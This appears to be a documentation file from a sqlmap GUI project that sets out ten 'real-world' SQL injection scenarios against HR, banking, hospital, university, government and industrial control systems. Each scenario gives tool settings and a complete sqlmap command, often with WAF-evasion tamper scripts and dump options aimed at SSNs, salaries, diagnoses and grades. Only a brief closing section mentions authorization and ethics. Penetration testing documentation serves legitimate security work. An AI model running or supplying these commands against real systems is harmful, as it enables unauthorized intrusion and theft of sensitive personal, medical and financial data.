# Real-World Penetration Testing Scenarios

This document provides practical examples of SQL injection testing scenarios encountered during real penetration testing engagements, with corresponding GUI configurations.

## 🏢 Corporate Web Application Testing

### Scenario 1: Legacy HR Management System
**Target:** Internal HR system with employee database
**Vulnerability:** Classic UNION-based injection in employee search

**Discovery Phase:**
```
Target Tab:
├── URL: http://hr.internal.company.com/employee.php?search=john
├── Method: GET
├── Cookie: session_id=authenticated_hr_user
└── User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

Detection Tab:
├── Level: 3
├── Risk: 2
├── Techniques: BEU
├── Time Delay: 2
└── Retries: 2

Injection Tab:
├── Testable Parameters: search
├── DBMS: MySQL
├── Union Columns: 5
└── Union Test All: ✓
```

**Exploitation Phase:**
```
Enumeration Tab:
├── Database: hr_database
├── Table: employees
├── Columns: emp_id,name,salary,ssn,email
├── Dump Table: ✓
└── Where: salary > 100000

General Tab:
├── Output Directory: ./hr_data/
├── CSV Format: ✓
├── Verbose Level: 2
└── Log File: ./hr_data/extraction.log
```

**Generated Commands:**
```bash
# Initial detection
sqlmap -u "http://hr.internal.company.com/employee.php?search=john" --cookie="session_id=authenticated_hr_user" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" --level=3 --risk=2 --technique=BEU --time-sec=2 --retries=2 -p search --dbms=mysql --union-cols=5 --union-test-all --batch

# Data extraction
sqlmap -u "http://hr.internal.company.com/employee.php?search=john" --cookie="session_id=authenticated_hr_user" -D hr_database -T employees --columns --dump --where="salary > 100000" --output-dir=./hr_data/ --csv -v 2 --log-file=./hr_data/extraction.log --batch
```

### Scenario 2: E-commerce Product Catalog
**Target:** Online store product search functionality
**Vulnerability:** Blind boolean-based injection with WAF

**Configuration:**
```
Target Tab:
├── URL: https://store.company.com/products.php?category=electronics&price_max=1000
├── Method: GET
├── Random Agent: ✓
├── Delay: 3
└── Timeout: 30

Injection Tab:
├── Testable Parameters: category,price_max
├── Tamper Scripts:
│   ├── space2comment
│   ├── randomcase
│   └── apostrophemask
├── DBMS: PostgreSQL
└── Invalid Logical: ✓

Detection Tab:
├── Level: 4
├── Risk: 3
├── Techniques: B (Boolean-based only)
├── Time Delay: 1
└── Retries: 3

Request Tab:
├── Proxy: http://127.0.0.1:8080
├── Chunked: ✓
└── Keep Alive: ✓
```

**Generated Command:**
```bash
sqlmap -u "https://store.company.com/products.php?category=electronics&price_max=1000" --random-agent --delay=3 --timeout=30 -p category,price_max --tamper=space2comment,randomcase,apostrophemask --dbms=postgresql --invalid-logical --level=4 --risk=3 --technique=B --time-sec=1 --retries=3 --proxy=http://127.0.0.1:8080 --chunked --keep-alive --batch
```

## 🏦 Financial Institution Testing

### Scenario 3: Banking Transaction History
**Target:** Customer transaction viewing system
**Vulnerability:** Time-based injection in account history

**Configuration:**
```
Target Tab:
├── URL: https://bank.com/transactions.php?account=123456&date_from=2023-01-01
├── Method: GET
├── Cookie: session=bank_customer_session
├── Certificate: /path/to/client.crt
└── Key: /path/to/client.key

Detection Tab:
├── Level: 5
├── Risk: 3
├── Techniques: T (Time-based only)
├── Time Delay: 5
└── Retries: 5

Injection Tab:
├── Testable Parameters: account,date_from
├── DBMS: Oracle
├── Tamper Scripts: space2comment
└── No Escape: ✓

Request Tab:
├── Safe URL: https://bank.com/keepalive.php
├── Safe POST: session_refresh=1
├── Delay: 2
└── Timeout: 120
```

**Generated Command:**
```bash
sqlmap -u "https://bank.com/transactions.php?account=123456&date_from=2023-01-01" --cookie="session=bank_customer_session" --client-cert=/path/to/client.crt --client-key=/path/to/client.key --level=5 --risk=3 --technique=T --time-sec=5 --retries=5 -p account,date_from --dbms=oracle --tamper=space2comment --no-escape --safe-url="https://bank.com/keepalive.php" --safe-post="session_refresh=1" --delay=2 --timeout=120 --batch
```

## 🏥 Healthcare System Testing

### Scenario 4: Medical Records Database
**Target:** Hospital patient management system
**Vulnerability:** Stacked queries in appointment scheduling

**Configuration:**
```
Target Tab:
├── URL: https://hospital.com/appointments.php
├── Method: POST
├── Data: patient_id=123&doctor_id=456&date=2024-01-15
├── Cookie: medical_staff_session=authenticated
└── Referer: https://hospital.com/dashboard.php

Injection Tab:
├── Testable Parameters: patient_id,doctor_id
├── DBMS: Microsoft SQL Server
├── Multiple Statements: ✓
├── Stacked Test: ✓
└── Tamper Scripts: space2comment,charencode

Detection Tab:
├── Level: 4
├── Risk: 3
├── Techniques: S (Stacked queries)
└── Time Delay: 2

Enumeration Tab:
├── Database: medical_db
├── Table: patient_records
├── Columns: patient_id,name,dob,diagnosis,treatment
├── Dump Table: ✓
└── Start from Entry: 1
```

**Generated Command:**
```bash
sqlmap -u "https://hospital.com/appointments.php" --method=POST --data="patient_id=123&doctor_id=456&date=2024-01-15" --cookie="medical_staff_session=authenticated" --referer="https://hospital.com/dashboard.php" -p patient_id,doctor_id --dbms=mssql --multiple-statements --stacked-test --tamper=space2comment,charencode --level=4 --risk=3 --technique=S --time-sec=2 -D medical_db -T patient_records --columns --dump --start=1 --batch
```

## 🏫 Educational Institution Testing

### Scenario 5: University Grade Management
**Target:** Student grade viewing system
**Vulnerability:** Error-based injection in grade lookup

**Configuration:**
```
Target Tab:
├── URL: https://university.edu/grades.php?student_id=12345&course_id=CS101
├── Method: GET
├── Cookie: student_portal_session=valid
└── User Agent: Mozilla/5.0 (compatible; UniversityBot/1.0)

Detection Tab:
├── Level: 3
├── Risk: 2
├── Techniques: E (Error-based)
├── Time Delay: 1
└── Retries: 2

Injection Tab:
├── Testable Parameters: student_id,course_id
├── DBMS: MySQL
├── Union Columns: 6
└── Union Test All: ✓

Enumeration Tab:
├── Database: student_db
├── Table: grades
├── Columns: student_id,course_id,grade,instructor,comments
├── Dump Table: ✓
└── Where: grade < 'C'
```

**Generated Command:**
```bash
sqlmap -u "https://university.edu/grades.php?student_id=12345&course_id=CS101" --cookie="student_portal_session=valid" --user-agent="Mozilla/5.0 (compatible; UniversityBot/1.0)" --level=3 --risk=2 --technique=E --time-sec=1 --retries=2 -p student_id,course_id --dbms=mysql --union-cols=6 --union-test-all -D student_db -T grades --columns --dump --where="grade < 'C'" --batch
```

## 🛒 E-commerce Platform Testing

### Scenario 6: Shopping Cart Injection
**Target:** Online store checkout process
**Vulnerability:** Second-order injection in order processing

**Configuration:**
```
Target Tab:
├── URL: https://shop.com/checkout.php
├── Method: POST
├── Data: cart_id=789&payment_method=credit_card&amount=99.99
├── Cookie: customer_session=shopping_cart_session
└── Delay: 5

Miscellaneous Tab:
├── Second-Order: https://shop.com/add_to_cart.php
├── Second-Order Data: product_id=1&quantity=1
├── Second-Order Method: POST
└── Second-Order Delay: 2

Injection Tab:
├── Testable Parameters: cart_id
├── DBMS: MySQL
├── Tamper Scripts: space2comment
└── Invalid Logical: ✓

Detection Tab:
├── Level: 4
├── Risk: 3
├── Techniques: BEUSTQ
└── Time Delay: 3

Request Tab:
├── Safe URL: https://shop.com/session_keepalive.php
├── Safe POST: keep_alive=1
└── Timeout: 60
```

**Generated Command:**
```bash
sqlmap -u "https://shop.com/checkout.php" --method=POST --data="cart_id=789&payment_method=credit_card&amount=99.99" --cookie="customer_session=shopping_cart_session" --delay=5 --second-order="https://shop.com/add_to_cart.php" --second-order-data="product_id=1&quantity=1" --second-order-method=POST --second-order-delay=2 -p cart_id --dbms=mysql --tamper=space2comment --invalid-logical --level=4 --risk=3 --technique=BEUSTQ --time-sec=3 --safe-url="https://shop.com/session_keepalive.php" --safe-post="keep_alive=1" --timeout=60 --batch
```

## 🏨 Hospitality Industry Testing

### Scenario 7: Hotel Booking System
**Target:** Hotel reservation management
**Vulnerability:** UNION-based injection in room availability

**Configuration:**
```
Target Tab:
├── URL: https://hotel.com/availability.php?checkin=2024-02-01&checkout=2024-02-05&rooms=2
├── Method: GET
├── Cookie: booking_session=guest_user
└── Random Agent: ✓

Injection Tab:
├── Testable Parameters: checkin,checkout,rooms
├── DBMS: PostgreSQL
├── Union Columns: 8
├── Union Character: NULL
└── Union Test All: ✓

Detection Tab:
├── Level: 3
├── Risk: 2
├── Techniques: U (UNION only)
└── Time Delay: 2

Enumeration Tab:
├── Database: hotel_db
├── Table: reservations
├── Columns: guest_id,room_number,checkin_date,checkout_date,total_amount
├── Dump Table: ✓
└── Where: checkout_date > CURRENT_DATE
```

**Generated Command:**
```bash
sqlmap -u "https://hotel.com/availability.php?checkin=2024-02-01&checkout=2024-02-05&rooms=2" --cookie="booking_session=guest_user" --random-agent -p checkin,checkout,rooms --dbms=postgresql --union-cols=8 --union-char=NULL --union-test-all --level=3 --risk=2 --technique=U --time-sec=2 -D hotel_db -T reservations --columns --dump --where="checkout_date > CURRENT_DATE" --batch
```

## 📰 Media and Publishing Testing

### Scenario 8: News CMS Article Management
**Target:** Content management system for news articles
**Vulnerability:** Blind injection in article search

**Configuration:**
```
Target Tab:
├── URL: https://news.com/admin/articles.php?search=breaking&category=politics
├── Method: GET
├── Cookie: cms_admin_session=authenticated
└── User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

Detection Tab:
├── Level: 4
├── Risk: 2
├── Techniques: B (Boolean-based)
├── Time Delay: 1
└── Retries: 3

Injection Tab:
├── Testable Parameters: search,category
├── DBMS: MySQL
├── Tamper Scripts: space2comment,randomcase
└── Invalid Logical: ✓

Enumeration Tab:
├── Database: cms_db
├── Table: articles
├── Columns: id,title,content,author,publish_date,status
├── Dump Table: ✓
└── Where: status = 'draft'
```

**Generated Command:**
```bash
sqlmap -u "https://news.com/admin/articles.php?search=breaking&category=politics" --cookie="cms_admin_session=authenticated" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" --level=4 --risk=2 --technique=B --time-sec=1 --retries=3 -p search,category --dbms=mysql --tamper=space2comment,randomcase --invalid-logical -D cms_db -T articles --columns --dump --where="status = 'draft'" --batch
```

## 🏭 Manufacturing and IoT Testing

### Scenario 9: Industrial Control System
**Target:** Manufacturing plant monitoring dashboard
**Vulnerability:** Time-based injection in sensor data queries

**Configuration:**
```
Target Tab:
├── URL: http://ics.plant.local/sensors.php?sensor_id=001&time_range=24h
├── Method: GET
├── Cookie: operator_session=valid
└── Delay: 10 (industrial systems often slow)

Detection Tab:
├── Level: 5
├── Risk: 3
├── Techniques: T (Time-based)
├── Time Delay: 10
└── Retries: 5

Injection Tab:
├── Testable Parameters: sensor_id,time_range
├── DBMS: SQLite
├── Tamper Scripts: space2comment
└── No Escape: ✓

Request Tab:
├── Timeout: 300
├── Keep Alive: ✓
└── Delay: 5
```

**Generated Command:**
```bash
sqlmap -u "http://ics.plant.local/sensors.php?sensor_id=001&time_range=24h" --cookie="operator_session=valid" --delay=10 --level=5 --risk=3 --technique=T --time-sec=10 --retries=5 -p sensor_id,time_range --dbms=sqlite --tamper=space2comment --no-escape --timeout=300 --keep-alive --delay=5 --batch
```

## 🏛️ Government System Testing

### Scenario 10: Public Records Database
**Target:** Government citizen records system
**Vulnerability:** Error-based injection in citizen lookup

**Configuration:**
```
Target Tab:
├── URL: https://gov.agency.gov/citizen.php?ssn=123-45-6789&state=CA
├── Method: GET
├── Certificate: /path/to/gov_client.crt
├── Key: /path/to/gov_client.key
├── CA Certificate: /path/to/gov_ca.crt
└── Timeout: 120

Detection Tab:
├── Level: 4
├── Risk: 2
├── Techniques: E (Error-based)
├── Time Delay: 2
└── Retries: 3

Injection Tab:
├── Testable Parameters: ssn,state
├── DBMS: Oracle
├── Union Columns: 10
└── Union Test All: ✓

Request Tab:
├── Safe URL: https://gov.agency.gov/session_refresh.php
├── Safe POST: refresh_token=valid
└── Delay: 3
```

**Generated Command:**
```bash
sqlmap -u "https://gov.agency.gov/citizen.php?ssn=123-45-6789&state=CA" --client-cert=/path/to/gov_client.crt --client-key=/path/to/gov_client.key --ca-cert=/path/to/gov_ca.crt --timeout=120 --level=4 --risk=2 --technique=E --time-sec=2 --retries=3 -p ssn,state --dbms=oracle --union-cols=10 --union-test-all --safe-url="https://gov.agency.gov/session_refresh.php" --safe-post="refresh_token=valid" --delay=3 --batch
```

## 📋 Testing Methodology Best Practices

### Pre-engagement Planning
1. **Scope Definition**: Clearly define testing boundaries and constraints
2. **Authorization**: Obtain explicit written permission for all testing activities
3. **Data Handling**: Establish procedures for handling sensitive data discovery
4. **Communication**: Set up regular check-ins and reporting schedules

### During Testing
1. **Documentation**: Record all findings with detailed reproduction steps
2. **Impact Assessment**: Evaluate the business impact of each vulnerability
3. **Chain Exploitation**: Look for ways to combine multiple vulnerabilities
4. **Cleanup**: Remove any test data or backdoors created during testing

### Post-engagement
1. **Reporting**: Provide comprehensive report with remediation guidance
2. **Verification**: Confirm all critical findings are addressed
3. **Lessons Learned**: Document testing methodology improvements
4. **Follow-up**: Schedule re-testing to verify fixes

### Legal Considerations
- **Compliance**: Ensure testing complies with relevant laws and regulations
- **Confidentiality**: Protect all discovered sensitive information
- **Chain of Custody**: Maintain proper documentation of evidence
- **Professional Standards**: Follow industry best practices and standards

---

## 🎯 Key Takeaways

Real-world SQL injection testing requires:
- **Adaptability**: Each target environment is unique
- **Patience**: Complex systems may require extended testing time
- **Thoroughness**: Comprehensive coverage of all injection points
- **Professionalism**: Ethical conduct and proper documentation
- **Continuous Learning**: Staying updated with new techniques and bypasses

Remember: The goal is to improve security, not cause harm. Always follow legal and ethical guidelines in your testing activities.</content>
<parameter name="filePath">/home/devil/Desktop/SQLmap-GUI-Advanced-SQL-Injection-Testing-Interface/docs/examples/real_world_scenarios.md
